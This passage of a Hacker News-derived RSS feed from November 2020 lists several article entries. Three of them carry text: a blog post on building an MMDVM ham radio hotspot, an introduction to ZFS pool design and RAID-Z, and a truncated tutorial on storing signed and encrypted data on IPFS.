<![CDATA[Assassin’s Creed: Valhalla and the Unfortunate Implications]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25157722">thread link</a>) | @parsecs
<br/>
November 19, 2020 | https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157722</guid>
            <pubDate>Fri, 20 Nov 2020 06:04:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Plato at the Googleplex: Why Philosophy Won't Go Away]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157681">thread link</a>) | @unquote
<br/>
November 19, 2020 | https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab | <a href="https://web.archive.org/web/*/https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157681</guid>
            <pubDate>Fri, 20 Nov 2020 05:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Thought and Official Propaganda]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157602">thread link</a>) | @pavelegorkin
<br/>
November 19, 2020 | https://bookpub.club/book/1595536562994x193811667155312740 | <a href="https://web.archive.org/web/*/https://bookpub.club/book/1595536562994x193811667155312740">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bookpub.club/book/1595536562994x193811667155312740</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157602</guid>
            <pubDate>Fri, 20 Nov 2020 05:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building My Own LoneStar Electronics Mmdvm Hotspot]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157515">thread link</a>) | @parsecs
<br/>
November 19, 2020 | https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/ | <a href="https://web.archive.org/web/*/https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane">
  <div>
    
    <p>If you’re reading this post on my new LoneStar Electronics MMDVM hotspot, then you no doubt decided to explore the option of buiding one yourself after noting the price of some of the commercially available hotspots. For example the Zumspot form Ham Radio Outlet retails between $150 - $160, and that’s not including a case to safeguard it. And let’s not forget about BridgeCom Systems who absolutely rape you on the price of their SkyBridge Hotspot; $299 is rip off.</p>
<p>So, “What did you build and what did it cost?” you ask. I built a simple small form MMDVM hotspot using the LoneStar MMDVM Simplex Board. Combined cost for the build is $140, and if you want the OLED screen you can add on another $10 for a total $150. Now before you start complaining there are Jumbospots on eBay for $75, let me remind you that those are made from questionable components. If you want to purchase one of these, fine but don’t be surprised if it underperforms or completely dies on you. That’s the price you pay for not paying full price.</p>
<h2 id="background">Background</h2>
<p>Before we dive into the build, allow me give you a little background of my motivations behind this project and my requirements. To begin with, I believe the cost of commercially available hotspots is too high provided the quality of components used. Second, I didn’t like any of the available options on the market.</p>
<p>I think the OLED screen that’s attached to most MMDVM boards is ridiculously small. During my research on hotspot cases, I came across the line of cases from C4Labs with either 2.4” or 3.5” Nextion screens. This intrigued me because they are so much bigger than the OLED screens attached to the MMDVM boards. Bigger is better right?! Well… it turns out the screen is just a novelty and doesn’t provide any functionally beyond displaying which room/reflector/talkgroup you’re connected to and the callsign of the current person speaking. My Yaseu FT3D already does this for me. I asked around and couldn’t find anyone who thought it was a must have feature. Knowing this, I decided that I didn’t need either the OLED or Nextion screen. However, I still want the option to attach a screen to my hotspot should I change my mind in the future.</p>
<p>One of the biggest complaints against hotspots is the accusation that it isn’t real ham radio because most users operate them within ten feet of themselves. Personally I don’t care what you’re opinion on this topic is, the fact of the mater is that I’m going to be within ten feet of my hotspot when I employ it. With such limited distances between the users and their hotspot, I challenge the need for SMA connectors attached to the MMDVM board. The connectors are just soldered onto the board with nothing more to secure them in place. Luckily the MMDVM board I want to use comes with a ceramic antenna surface mounted onto the board. No need for me to worry about breaking the solder joints on a SMA connector.</p>
<p>With that out of the way, let’s move onto the parts utilized for this build.</p>
<h2 id="parts-list">Parts List</h2>
<h3 id="lonestar-mmdvm-simplex-board">LoneStar MMDVM Simplex Board</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/lonestar-mmdvm-simplex-board.webp" alt="LoneStar MMDVM Simplex Board"> <figcaption>
            <p>LoneStar MMDVM Simplex Board</p>
        </figcaption>
</figure>

<p>The most essential component of a hotspot is the MMDVM board. I want the most superior performance and quality for my hotspot, so I don’t want to compromise by buying a cheap MMDVM board. The LoneStar MMDVM Simplex Board, designed by N5BOC David Dennis, is considerable more expensive than other MMDVM boards, however it’s constructed of higher-quality components and has the following features:</p>
<ul>
<li>It has its own dedicated 3.3V regulator and does not pull voltage off of the noisy Raspberry Pi 3.3V line like all other simplex board do.</li>
<li>The board is a four layer PCB with large ground planes for 3.3V and GND sandwiched in the middle of the PCB. This acts as one very large decoupling cap the size of the entire board. Also this isolates signals between top side and bottom side.</li>
<li>All of the Analog RF signals are on the top side only and the high harmonic digital signals are all kept isolated on the bottom side. Making this board much more stable. It should also make it more sensitive on receive.</li>
</ul>
<h3 id="c4labs-jrz-1s-case">C4Labs JRZ-1S Case</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/c4labs-case.webp" alt="C4Labs JRZ-1S Case"> <figcaption>
            <p>C4Labs JRZ-1S Case</p>
        </figcaption>
</figure>

<p>I like this case; it’s modest yet does the job very well once it’s completely together. As an added touch of class, I went with the wood inlays. I also sanded the sides of the case with 400 grit sandpaper to give it that frosted glass look. I appreciate how it turned out. The actual case is engineered very well with the components fitting in securely inside. Interestingly enough one layer of the case does include holes drilled in it to support the prongs of an SMA connector. It’s a thoughtful touch, but I’m keenly uninterested in trying to find out how well they work.</p>
<h3 id="raspberry-pi-zero-wh">Raspberry Pi Zero WH</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/raspberry-pi-zero-wh.webp" alt="Raspberry Pi Zero WH"> <figcaption>
            <p>Raspberry Pi Zero WH</p>
        </figcaption>
</figure>

<p>Nothing extremely exceptional about this other than I purchased it from Adafruit. I went with the Zero WH instead of the Zero W, because I don’t know how to solder very well and didn’t want to ruin the thing. One of these days I need to force myself to learn and become better.</p>
<h2 id="the-finished-build">The Finished Build</h2>
<figure>
    <img src="https://www.kj7nzl.net/img/hotspots/complete-hotspot.webp" alt="Custom LoneStar MMDVM Simplex Board Hotspot"> <figcaption>
            <p>Custom LoneStar MMDVM Simplex Board Hotspot</p>
        </figcaption>
</figure>

<p>Here’s the finished hotspot. If you look in the top right-hand corner above the heatsink, you’ll recognize the ceramic antenna. With the hotspot located in my basement, I’m nevertheless able to connect to it will my Yaesu FT3D running 300 mW. Should I want to ever want to attach a screen I can because there are connections present for the Nextion and OLED displays. The only gripe I have remains the location of the micro-USB port on the Pi Zero. If you couldn’t determine from the photo the case is upside down. Well, I can’t do anything about that so, I’ll have to live with it. Overall I’m impressed with the build quality of the hotspot and look forward to using it for years to come.</p>

  </div>
</section></div>]]>
            </description>
            <link>https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157515</guid>
            <pubDate>Fri, 20 Nov 2020 05:18:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to ZFS]]>
            </title>
            <description>
<![CDATA[
Score 151 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25157491">thread link</a>) | @arm
<br/>
November 19, 2020 | https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage.png" data-caption="Truenas Homepage"><img width="696" height="496" src="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-696x496.png" srcset="https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-696x496.png 696w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-400x285.png 400w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-800x570.png 800w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-1068x761.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-589x420.png 589w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage-100x70.png 100w, https://www.servethehome.com/wp-content/uploads/2020/06/truenas-homepage.png 1291w" sizes="(max-width: 696px) 100vw, 696px" alt="Truenas Homepage" title="Truenas Homepage"></a><figcaption>Truenas Homepage</figcaption></figure></div>
            <!-- content --><p>ZFS has become increasingly popular in recent years. ZFS on Linux (ZoL) has pushed the envelope and exposed many newcomers to the ZFS fold. iXsystems has adopted the newer codebase, now called <strong>OpenZFS, </strong>into its codebase for TrueNAS CORE. The purpose of this article is to help those of you who have heard about ZFS but have not yet had the opportunity to research it.</p>
<p>Our hope is that we leave you with a better understanding of how and why it works the way it does. Knowledge is key to the decision-making process, and we feel that ZFS is something worth considering for most organizations.<br>
<span id="more-44288"></span></p>
<h2>What is ZFS?</h2>
<p>ZFS is a <strong>filesystem</strong>, but unlike most other file systems it is also the <strong>logical volume manager</strong> or LVM. What that means is ZFS directly controls not only how the bits and blocks of your files are stored on your hard drives, but it also controls how your hard drives are logically arranged for the purposes of RAID and redundancy. ZFS is also classified as a <strong>copy-on-write</strong> or <a href="https://www.ixsystems.com/documentation/freenas/11.2/zfsprimer.html">COW filesystem</a>. This means that ZFS can do some cool things like <strong>snapshots</strong> that a normal filesystem like NTFS could not. A snapshot can be thought of like it sounds, a photograph of how something was at a point in time. How a COW filesystem works, however, has some important implications that we need to discuss.</p>
<figure id="attachment_44997" aria-describedby="caption-attachment-44997"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png" alt="The Open ZFS Logo" width="322" height="300" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png 322w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-800x746.png 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-696x649.png 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-450x420.png 450w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_.png 1024w" sizes="(max-width: 322px) 100vw, 322px"><figcaption id="caption-attachment-44997">The Open ZFS Logo</figcaption></figure>
<p>Hard Drives work such that the pieces of your data are stored in <strong>Logical Block Addresses</strong>, or LBAs. ZFS is aware of what LBAs a specific file is stored in. Let us say we need to write a file that is big enough to fit into 3 blocks. We are going to store that file in LBA 1000, 1001, and 1002. This is considered a sequential write, as all of these blocks are stored directly next to each other. For spinning hard drives, this is ideal, as the write head does not have to move off of the track it is on.</p>
<figure id="attachment_23424" aria-describedby="caption-attachment-23424"><a href="https://www.servethehome.com/western-digital-red-pro-10tb-nas-hdd-review/wd-red-10tb-pro-nas-top/" rel="attachment wp-att-23424"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg" alt="WD Red 10TB Pro NAS Top" width="800" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg 800w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-305x300.jpg 305w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-696x684.jpg 696w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-427x420.jpg 427w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-23424">WD Red 10TB Pro NAS Top <a href="https://www.servethehome.com/wd-red-smr-vs-cmr-tested-avoid-red-smr/">Use CMR with ZFS, not SMR</a></figcaption></figure>
<p>Now, let us say we make a change to the file and the part that was stored at LBA 1001 needs to be modified. When we write that change, ZFS does not over-write the part of the file that was stored in 1001. Instead, it will write that block to LBA 2001. LBA 1001 will be kept as-is until the snapshot keeping it there expires. This allows us to have both the current version of the file, and the previous one, while <em>only storing the difference.</em> However, the next time we go to read the file back, the read head of our spinning hard drive needs to read LBA 1000, go to the track where LBA 2001 is stored, read that, and then go back to the track where LBA 1002 is stored. This phenomenon is called <strong>fragmentation.</strong></p>
<h2>A Primer on ZFS Pool Design</h2>
<p>To make ZFS pools easier to understand, we are going to focus on using small storage containers as you may have around the house or shop. Before we continue, it is worth defining some terms. A <strong>VDEV, </strong>or virtual device, is a logical grouping of one or more storage devices. A <strong>pool</strong> is then a logically defined group built from 1 or more VDEVs. ZFS is very customizable, and therefore, there are many different types of configurations for VDEVs. You can think of the construction of a ZFS pool by visualizing the following graphic:</p>
<figure id="attachment_45011" aria-describedby="caption-attachment-45011"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg" alt="Nested Storage Containers" width="696" height="453" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-400x261.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1536x1001.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-2048x1334.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-696x453.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1068x696.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-645x420.jpg 645w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45011">Nested Storage Containers</figcaption></figure>
<p>Starting from the smallest container size, we have our drives. We can see that in this visualization we have two drives in each larger container. These two larger containers are our VDEVs. The single largest container, then, is our pool. In this configuration, we would have each pair of drives in a <strong>mirror. </strong>This means that one drive can fail in either (or both!) VDEV and the pool would continue to function in a <strong>degraded</strong> state.</p>
<figure id="attachment_45012" aria-describedby="caption-attachment-45012"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg" alt="Two Mirrors, Each VDEV with One Bad Drive" width="696" height="468" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-400x269.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1536x1034.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-2048x1378.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-696x468.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1068x719.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-624x420.jpg 624w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45012">Two Mirrors, Each VDEV with One Bad Drive</figcaption></figure>
<p>However, if 2 drives in a <strong>single</strong> VDEV, all of the data in our entire pool is lost. There is no redundancy of the pool itself, all redundancy in ZFS is in the VDEV layer. If one <em>VDEV</em> fails, there is not enough information to rebuild the missing data.</p>
<figure id="attachment_45013" aria-describedby="caption-attachment-45013"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg" alt="Two Mirrors, One VDEV where Both Drives Failed" width="696" height="486" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-400x280.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1536x1074.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-696x487.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1068x747.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-601x420.jpg 601w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-100x70.jpg 100w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed.jpg 1991w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45013">Two Mirrors, One VDEV where Both Drives Failed</figcaption></figure>
<p>Next, we need to define what&nbsp;<strong>RAID-Z</strong> is and what the various levels of RAID-Z are. RAID-Z is a way of putting multiple drives together into a VDEV and storing <strong>parity,&nbsp;</strong>or fault tolerance. In ZFS, there is no dedicated “parity drive” like in&nbsp;<strong>Unraid</strong>, but it instead stores parity across all of the drives in the VDEV.&nbsp; The amount of parity that is spread across the drives determines the level of RAID-Z. It is in this way more similar to traditional hardware RAID.</p>
<p>What can make RAID-Z a better approach than a mirrored configuration is that it does not matter <em>what&nbsp;</em>drive fails in a RAID-Z. Each drive is an equal partner, whereas, in a mirrored configuration, each mirrored VDEV is a separate entity. This benefit of RAID-Z comes at the cost of performance, however, and a mirrored pool will almost always be <em>faster</em>&nbsp;than RAID Z.</p>
<p><strong>RAID-Z</strong>&nbsp;is similar to a traditional&nbsp;<strong>RAID 5. </strong>In RAID-Z you have one drive worth of parity. In other words, if you lose one drive, your pool will continue to function. For RAID-Z you need a minimum of 3 drives per VDEV. You can have 3, 7, or even 12 drives in a RAID-Z VDEV. The more drives which you add, however, the longer it will take to <strong>resilver,&nbsp;</strong>or rebuild.</p>
<p>This increased time increases the risk of your data, as a second drive failure during this process would destroy your pool. ZFS will resilver while the data is still in use, it is a live recovery. The implication of this is that our disks are working harder than usual during this process, and this can increase the chances of a second drive failure. Your data is still accessible and in production, while it is reading all of the parity data from the existing members of your VDEV and then writing it to the new disk.</p>
<figure id="attachment_45014" aria-describedby="caption-attachment-45014"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg" alt="A Pool with a Single 3-Disk Raid Z1 VDEV" width="696" height="495" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--400x285.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1536x1093.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--2048x1458.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--696x495.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1068x760.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--590x420.jpg 590w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45014">A Pool with a Single 3-Disk Raid-Z VDEV</figcaption></figure>
<p>A RAID-Z2 VDEV is more akin to a RAID 6. In this configuration, 2 drives worth of parity is stored across all of your devices. You can lose up to two drives per VDEV and your pool will still function. Adding more parity drives increases calculations required which means you need more processing performance to operate the array.</p>
<figure id="attachment_45015" aria-describedby="caption-attachment-45015"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg" alt="A Pool with a Single 4-Disk Raid Z2 VDEV" width="696" height="479" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-400x276.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1536x1059.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-2048x1412.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-218x150.jpg 218w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-696x480.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1068x736.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-609x420.jpg 609w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45015">A Pool with a Single 4-Disk Raid Z2 VDEV</figcaption></figure>
<p>Finally, a RAID-Z3 VDEV provides three drives worth of parity, so you can lose up to three drives per VDEV and your pool will still function. <strong>The more drives of parity you add, however, the slower your performance ends up being</strong>. You need a minimum of four but should use at least five drives to build a RAID-Z3 VDEV.</p>
<h2>The Need for Speed</h2>
<p>There are two ways in which we measure speed or <em>fastness</em>,&nbsp;<strong>IOPS,</strong>&nbsp;and&nbsp;<strong>Throughput</strong>. In RAIDZ, more drives will give you more throughput, or the actual read and write speed you see when transferring files. However, if you have ever tried to run multiple file copies in Windows simultaneously, you may have noticed the more you do, the slower it gets. It does not always get slower at a constant rate, the more you try to do disks will get exponentially slower. This is because your disk can only do so many Input/Output Operations per Second, or IOPS.</p>
<p>RAIDZ will scale in&nbsp;<em>throughput</em>&nbsp;with the more disks you add, but it does not scale with&nbsp;<em>IOPS.</em> What that generally means is, RAIDZ is not traditionally the best choice for I/O intensive workloads, as the amount of IOPS is roughly limited to the slowest member of our VDEV if we exclude all of the caching ZFS has. Virtualization, as we are discussing here, is highly dependent on I/O.</p>
<p>Earlier, we discussed that ZFS is a COW filesystem, and because of that it suffers from data fragmentation. There are direct performance implications that stem from that fact.&nbsp;<strong>The more “full” your pool is, the slower it will ultimately get.&nbsp;</strong>Write speeds in ZFS are directly tied to the amount of&nbsp;<em>adjacent</em> free blocks there are to write to. As your pool fills up, and as data fragments, there are fewer and fewer blocks that are directly adjacent to one another. A single large file may span blocks scattered all over the surface of your hard drive. Even though you would expect that file to be a sequential write, it no longer can be if your drive is full.</p>
<figure id="attachment_45006" aria-describedby="caption-attachment-45006"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png" alt="Seagate Mobile HDD Crystal Disk Mark Performance" width="482" height="351" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png 482w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-400x291.png 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-324x235.png 324w" sizes="(max-width: 482px) 100vw, 482px"><figcaption id="caption-attachment-45006">Seagate Mobile HDD Crystal Disk Mark Performance</figcaption></figure>
<p>In the above graphic, we can see a Seagate 1TB mobile drive that I tested in CrystalDiskMark. It can do about 130 MB/s of sequential read and writes. We can also see that when we start doing random 4k I/O, the speed falls about <strong>100x</strong>. This is meant to illustrate the performance impact of data fragmentation. Additionally, we can see that the latency for these lookups can take about&nbsp;<strong>half of a second, </strong>and we are limited to about 350 IOPS. In order to be fast, virtualization workloads on traditional hard drives need to have many disks in order to compensate for this slowness. It would not be uncommon to see a pool constructed of 10 or more VDEVs of mirrored drives.</p>
<p>Additionally, there is some wisdom we can <a href="https://www.ixsystems.com/community/threads/the-path-to-success-for-block-storage.81165">borrow from the ZFS community</a>. As your pool fills up, and sequential writes become increasingly difficult to accomplish due to fragmentation, it will slow down in a non-linear way. As a general rule of thumb, at about 50% capacity your pool will be noticeably slower than it was when it was 10% capacity. At about 80%-96% capacity, your pool starts to become very slow, and ZFS will actually change its write algorithm to ensure data integrity, further slowing you down.</p>
<p>This is where SSDs come in. They radically change the game because they work very differently at the physical layer. They do not have read and write heads that are flying around a spinning disk back and forth trying to find your data. With the physical limitations of disk-based drives out of the way, SSDs can read and write non-sequential data <em>much&nbsp;</em>faster. They do not suffer the penalties of these rules nearly as severely, fragmentation does not hurt their performance to the same degree.</p>
<figure><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/05/970-EVO-Plus-250GB-Front.jpg" alt="A Samsung 970 EVO Plus SSD" width="1500" height="997"></figure>
<p>A Samsung 970 EVO Plus SSD</p>
<p>Hard drives have increased in capacity by leaps-and-bounds over the past couple of decades. We have seen hard drives grow from a single gigabyte in capacity and just last year <a href="https://www.servethehome.com/western-digital-volume-production-of-18tb-and-20tb-drives-in-2020/">Western Digital announced</a> that 18 and 20 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/">https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/</a></em></p>]]>
            </description>
            <link>https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157491</guid>
            <pubDate>Fri, 20 Nov 2020 05:12:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to store signed and encrypted data on IPFS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157017">thread link</a>) | @iamwil
<br/>
November 19, 2020 | https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/ | <a href="https://web.archive.org/web/*/https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data 